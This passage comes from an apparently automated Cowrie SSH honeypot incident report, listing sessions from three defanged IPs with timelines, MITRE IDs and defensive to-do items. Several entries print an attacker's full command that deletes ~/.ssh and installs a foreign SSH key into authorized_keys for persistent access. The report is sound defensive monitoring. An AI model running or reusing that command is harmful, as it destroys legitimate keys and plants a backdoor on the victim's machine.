| `2026-06-02 17:01:42` | `cowrie.login.success` |
| `2026-06-02 17:01:42` | `cowrie.session.params` |
| `2026-06-02 17:01:42` | `cowrie.command.input` |
| `2026-06-02 17:01:42` | `cowrie.command.failed` |
| `2026-06-02 17:01:42` | `cowrie.log.closed` |
| `2026-06-02 17:01:42` | `cowrie.session.params` |
| `2026-06-02 17:01:42` | `cowrie.command.input` |
| `2026-06-02 17:01:42` | `cowrie.session.file_download` |
| `2026-06-02 17:01:42` | `cowrie.log.closed` |
| `2026-06-02 17:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c74438331f5c

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:01 |
| **Last Seen** | 2026-06-02 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:01:43` | `cowrie.session.connect` |
| `2026-06-02 17:01:43` | `cowrie.client.version` |
| `2026-06-02 17:01:43` | `cowrie.client.kex` |
| `2026-06-02 17:01:43` | `cowrie.login.success` |
| `2026-06-02 17:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f362376e1c7

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:02 |
| **Last Seen** | 2026-06-02 17:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:02:10` | `cowrie.session.connect` |
| `2026-06-02 17:02:10` | `cowrie.client.version` |
| `2026-06-02 17:02:10` | `cowrie.client.kex` |
| `2026-06-02 17:02:11` | `cowrie.login.success` |
| `2026-06-02 17:02:11` | `cowrie.session.params` |
| `2026-06-02 17:02:11` | `cowrie.command.input` |
| `2026-06-02 17:02:11` | `cowrie.command.failed` |
| `2026-06-02 17:02:12` | `cowrie.log.closed` |
| `2026-06-02 17:02:12` | `cowrie.session.params` |
| `2026-06-02 17:02:12` | `cowrie.command.input` |
| `2026-06-02 17:02:13` | `cowrie.session.file_download` |
| `2026-06-02 17:02:13` | `cowrie.log.closed` |
| `2026-06-02 17:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d099b10a1e4d

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:02 |
| **Last Seen** | 2026-06-02 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:02:16` | `cowrie.session.connect` |
| `2026-06-02 17:02:16` | `cowrie.client.version` |
| `2026-06-02 17:02:16` | `cowrie.client.kex` |
| `2026-06-02 17:02:17` | `cowrie.login.success` |
| `2026-06-02 17:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d559068621f

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:03 |
| **Last Seen** | 2026-06-02 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:03:49` | `cowrie.session.connect` |
| `2026-06-02 17:03:49` | `cowrie.client.version` |
| `2026-06-02 17:03:49` | `cowrie.client.kex` |
| `2026-06-02 17:03:49` | `cowrie.login.success` |
| `2026-06-02 17:03:49` | `cowrie.session.params` |
| `2026-06-02 17:03:49` | `cowrie.command.input` |
| `2026-06-02 17:03:49` | `cowrie.command.failed` |
| `2026-06-02 17:03:49` | `cowrie.log.closed` |
| `2026-06-02 17:03:50` | `cowrie.session.params` |
| `2026-06-02 17:03:50` | `cowrie.command.input` |
| `2026-06-02 17:03:50` | `cowrie.session.file_download` |
| `2026-06-02 17:03:50` | `cowrie.log.closed` |
| `2026-06-02 17:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e4e5a99a5a

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:03 |
| **Last Seen** | 2026-06-02 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:03:51` | `cowrie.session.connect` |
| `2026-06-02 17:03:51` | `cowrie.client.version` |
| `2026-06-02 17:03:51` | `cowrie.client.kex` |
| `2026-06-02 17:03:51` | `cowrie.login.success` |
| `2026-06-02 17:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bfb5dbcb299

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:04 |
| **Last Seen** | 2026-06-02 17:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:04:07` | `cowrie.session.connect` |
| `2026-06-02 17:04:07` | `cowrie.client.version` |
| `2026-06-02 17:04:07` | `cowrie.client.kex` |
| `2026-06-02 17:04:09` | `cowrie.login.success` |
| `2026-06-02 17:04:09` | `cowrie.session.params` |
| `2026-06-02 17:04:09` | `cowrie.command.input` |
| `2026-06-02 17:04:09` | `cowrie.command.failed` |
| `2026-06-02 17:04:10` | `cowrie.log.closed` |
| `2026-06-02 17:04:10` | `cowrie.session.params` |
| `2026-06-02 17:04:10` | `cowrie.command.input` |
| `2026-06-02 17:04:10` | `cowrie.session.file_download` |
| `2026-06-02 17:04:10` | `cowrie.log.closed` |
| `2026-06-02 17:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f43e810d051

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 17:04 |
| **Last Seen** | 2026-06-02 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:04:13` | `cowrie.session.connect` |
| `2026-06-02 17:04:13` | `cowrie.client.version` |
| `2026-06-02 17:04:14` | `cowrie.client.kex` |
| `2026-06-02 17:04:15` | `cowrie.login.success` |
| `2026-06-02 17:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74937c62da98

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:05 |
| **Last Seen** | 2026-06-02 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:05:54` | `cowrie.session.connect` |
| `2026-06-02 17:05:54` | `cowrie.client.version` |
| `2026-06-02 17:05:54` | `cowrie.client.kex` |
| `2026-06-02 17:05:54` | `cowrie.login.success` |
| `2026-06-02 17:05:54` | `cowrie.session.params` |
| `2026-06-02 17:05:54` | `cowrie.command.input` |
| `2026-06-02 17:05:54` | `cowrie.command.failed` |
| `2026-06-02 17:05:54` | `cowrie.log.closed` |
| `2026-06-02 17:05:54` | `cowrie.session.params` |
| `2026-06-02 17:05:54` | `cowrie.command.input` |
| `2026-06-02 17:05:54` | `cowrie.session.file_download` |
| `2026-06-02 17:05:54` | `cowrie.log.closed` |
| `2026-06-02 17:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a82052d8e219

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:05 |
| **Last Seen** | 2026-06-02 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:05:55` | `cowrie.session.connect` |
| `2026-06-02 17:05:55` | `cowrie.client.version` |
| `2026-06-02 17:05:55` | `cowrie.client.kex` |
| `2026-06-02 17:05:55` | `cowrie.login.success` |
| `2026-06-02 17:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96695975cb8

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:07 |
| **Last Seen** | 2026-06-02 17:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:07:25` | `cowrie.session.connect` |
| `2026-06-02 17:07:25` | `cowrie.client.version` |
| `2026-06-02 17:07:25` | `cowrie.client.kex` |
| `2026-06-02 17:07:26` | `cowrie.login.success` |
| `2026-06-02 17:07:26` | `cowrie.session.params` |
| `2026-06-02 17:07:26` | `cowrie.command.input` |
| `2026-06-02 17:07:26` | `cowrie.command.failed` |
| `2026-06-02 17:07:27` | `cowrie.log.closed` |
| `2026-06-02 17:07:27` | `cowrie.session.params` |
| `2026-06-02 17:07:27` | `cowrie.command.input` |
| `2026-06-02 17:07:28` | `cowrie.session.file_download` |
| `2026-06-02 17:07:28` | `cowrie.log.closed` |
| `2026-06-02 17:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce23e42e3d1

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:07 |
| **Last Seen** | 2026-06-02 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:07:31` | `cowrie.session.connect` |
| `2026-06-02 17:07:31` | `cowrie.client.version` |
| `2026-06-02 17:07:31` | `cowrie.client.kex` |
| `2026-06-02 17:07:32` | `cowrie.login.success` |
| `2026-06-02 17:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8403b3497cbd

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:07 |
| **Last Seen** | 2026-06-02 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:07:58` | `cowrie.session.connect` |
| `2026-06-02 17:07:58` | `cowrie.client.version` |
| `2026-06-02 17:07:58` | `cowrie.client.kex` |
| `2026-06-02 17:07:58` | `cowrie.login.success` |
| `2026-06-02 17:07:59` | `cowrie.session.params` |
| `2026-06-02 17:07:59` | `cowrie.command.input` |
| `2026-06-02 17:07:59` | `cowrie.command.failed` |
| `2026-06-02 17:07:59` | `cowrie.log.closed` |
| `2026-06-02 17:07:59` | `cowrie.session.params` |
| `2026-06-02 17:07:59` | `cowrie.command.input` |
| `2026-06-02 17:07:59` | `cowrie.session.file_download` |
| `2026-06-02 17:07:59` | `cowrie.log.closed` |
| `2026-06-02 17:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f59baea73fc

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:08 |
| **Last Seen** | 2026-06-02 17:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:08:00` | `cowrie.session.connect` |
| `2026-06-02 17:08:00` | `cowrie.client.version` |
| `2026-06-02 17:08:00` | `cowrie.client.kex` |
| `2026-06-02 17:08:00` | `cowrie.login.success` |
| `2026-06-02 17:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5387d5cec1e2

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:11 |
| **Last Seen** | 2026-06-02 17:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:11:11` | `cowrie.session.connect` |
| `2026-06-02 17:11:11` | `cowrie.client.version` |
| `2026-06-02 17:11:11` | `cowrie.client.kex` |
| `2026-06-02 17:11:12` | `cowrie.login.success` |
| `2026-06-02 17:11:13` | `cowrie.session.params` |
| `2026-06-02 17:11:13` | `cowrie.command.input` |
| `2026-06-02 17:11:13` | `cowrie.command.failed` |
| `2026-06-02 17:11:13` | `cowrie.log.closed` |
| `2026-06-02 17:11:14` | `cowrie.session.params` |
| `2026-06-02 17:11:14` | `cowrie.command.input` |
| `2026-06-02 17:11:14` | `cowrie.session.file_download` |
| `2026-06-02 17:11:14` | `cowrie.log.closed` |
| `2026-06-02 17:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0a1be1de3e

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 17:11 |
| **Last Seen** | 2026-06-02 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:11:17` | `cowrie.session.connect` |
| `2026-06-02 17:11:17` | `cowrie.client.version` |
| `2026-06-02 17:11:17` | `cowrie.client.kex` |
| `2026-06-02 17:11:18` | `cowrie.login.success` |
| `2026-06-02 17:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f926ef43ff85

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:12 |
| **Last Seen** | 2026-06-02 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:12:09` | `cowrie.session.connect` |
| `2026-06-02 17:12:09` | `cowrie.client.version` |
| `2026-06-02 17:12:09` | `cowrie.client.kex` |
| `2026-06-02 17:12:09` | `cowrie.login.success` |
| `2026-06-02 17:12:09` | `cowrie.session.params` |
| `2026-06-02 17:12:09` | `cowrie.command.input` |
| `2026-06-02 17:12:09` | `cowrie.command.failed` |
| `2026-06-02 17:12:09` | `cowrie.log.closed` |
| `2026-06-02 17:12:09` | `cowrie.session.params` |
| `2026-06-02 17:12:09` | `cowrie.command.input` |
| `2026-06-02 17:12:09` | `cowrie.session.file_download` |
| `2026-06-02 17:12:09` | `cowrie.log.closed` |
| `2026-06-02 17:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabc7c561c42

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:12 |
| **Last Seen** | 2026-06-02 17:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:12:10` | `cowrie.session.connect` |
| `2026-06-02 17:12:10` | `cowrie.client.version` |
| `2026-06-02 17:12:10` | `cowrie.client.kex` |
| `2026-06-02 17:12:10` | `cowrie.login.success` |
| `2026-06-02 17:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
